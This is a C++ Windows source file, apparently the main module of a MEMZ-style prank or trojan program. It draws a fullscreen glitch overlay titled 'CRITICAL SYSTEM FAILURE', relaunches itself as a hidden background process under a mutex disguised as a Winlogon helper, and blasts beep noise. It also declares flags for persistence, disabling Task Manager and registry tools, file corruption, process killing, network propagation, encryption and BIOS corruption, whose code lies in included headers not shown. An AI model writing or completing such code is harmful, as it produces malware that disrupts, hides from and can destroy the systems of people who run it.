#include <Windows.h>
#include "VisualEffects.h"
#include "DestructiveActions.h"
#include "Utilities.h"
#include "AdvancedEffects.h"

// Global variables
HBITMAP hGlitchBitmap = NULL;
BYTE* pPixels = NULL;
int screenWidth, screenHeight;
BITMAPINFO bmi = {};
int intensityLevel = 1;
DWORD startTime = GetTickCount();
int cursorX = 0, cursorY = 0;
bool cursorVisible = true;
int screenShakeX = 0, screenShakeY = 0;
bool textCorruptionActive = false;
DWORD lastEffectTime = 0;
ULONG_PTR gdiplusToken;

// Critical mode
bool criticalMode = false;
DWORD bsodTriggerTime = 0;
bool persistenceInstalled = false;
bool disableTaskManager = false;
bool disableRegistryTools = false;
bool fileCorruptionActive = false;
bool processKillerActive = false;
bool g_isAdmin = false;
bool destructiveActionsTriggered = false;
bool networkPropagationActive = false;
bool encryptionActive = false;
bool biosCorruptionActive = false;

// Advanced effects
bool matrixRainActive = false;
bool fractalNoiseActive = false;
bool screenBurnActive = false;
bool wormholeEffectActive = false;
bool temporalDistortionActive = false;

// Containers
std::vector<Particle> particles;
std::vector<CorruptedText> corruptedTexts;
std::vector<MatrixStream> matrixStreams;
std::vector<FractalPoint> fractalPoints;
std::vector<Wormhole> wormholes;
std::mutex g_mutex;

// Random number generation
std::random_device rd;
std::mt19937 gen(rd());
std::uniform_int_distribution<> dis(0, 255);
std::uniform_real_distribution<> disf(0.0, 1.0);

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HDC hdcLayered = NULL;
    static BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
    
    switch (msg) {
    case WM_CREATE:
        hdcLayered = CreateCompatibleDC(NULL);
        SetTimer(hwnd, 1, REFRESH_RATE, NULL);
        return 0;
        
    case WM_TIMER: {
        CaptureScreen(hwnd);
        ApplyGlitchEffect();
        
        if (hdcLayered && hGlitchBitmap) {
            HDC hdcScreen = GetDC(NULL);
            POINT ptZero = {0, 0};
            SIZE size = {screenWidth, screenHeight};
            
            SelectObject(hdcLayered, hGlitchBitmap);
            UpdateLayeredWindow(hwnd, hdcScreen, &ptZero, &size, hdcLayered, 
                               &ptZero, 0, &blend, ULW_ALPHA);
            
            ReleaseDC(NULL, hdcScreen);
        }
        return 0;
    }
        
    case WM_DESTROY:
        KillTimer(hwnd, 1);
        if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
        if (hdcLayered) DeleteDC(hdcLayered);
        ShowCursor(TRUE);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Initialize random seed
    srand(static_cast<unsigned>(time(NULL)));
    
    // Check admin privileges
    g_isAdmin = IsRunAsAdmin();

    // Show warning messages
    if (!ShowWarningMessages()) {
        return 0;
    }

    // Check if already running
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\WinlogonHelperMutex");
    DWORD lastError = GetLastError();
    if (lastError == ERROR_ALREADY_EXISTS) {
        if (hMutex) {
            CloseHandle(hMutex);
        }
        
        if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
            return 0;
        }
        
        wchar_t szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
        
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpFile = szPath;
        sei.lpParameters = L"-background";
        sei.nShow = SW_HIDE;
        ShellExecuteExW(&sei);
        return 0;
    }

    startTime = GetTickCount();
    
    // Run background process
    if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
        RunBackgroundProcess();
        return 0;
    }
    
    // Main instance
    FreeConsole();
    
    WNDCLASSEXW wc = {
        sizeof(WNDCLASSEX), 
        CS_HREDRAW | CS_VREDRAW, 
        WndProc,
        0, 0, hInst, NULL, NULL, NULL, NULL,
        L"MEMZ_GLITCH_SIM", NULL
    };
    RegisterClassExW(&wc);
    
    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        wc.lpszClassName, 
        L"CRITICAL SYSTEM FAILURE",
        WS_POPUP, 
        0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        NULL, NULL, hInst, NULL
    );
    
    SetWindowPos(
        hwnd, HWND_TOPMOST, 0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        SWP_SHOWWINDOW
    );
    
    ShowWindow(hwnd, SW_SHOW);
    
    // Run background process
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = szPath;
    sei.lpParameters = L"-background";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
    
    // Play startup sound
    std::thread([]() {
        for (int i = 0; i < 15; i++) {
            Beep(300, 80);
            Beep(600, 80);
            Beep(900, 80);
            Sleep(15);
        }
        
        for (int i = 0; i < 100; i++) {
            Beep(rand() % 5000 + 500, 20);
            Sleep(2);
        }
        
        for (int i = 0; i < 8; i++) {
            Beep(50 + i * 200, 300);
        }
        
        // Play system sound
        PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
    }).detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    if (hMutex) {
        CloseHandle(hMutex);
    }
    
    // Shutdown GDI+
    GdiplusShutdown(gdiplusToken);
    
    return static_cast<int>(msg.wParam);
}
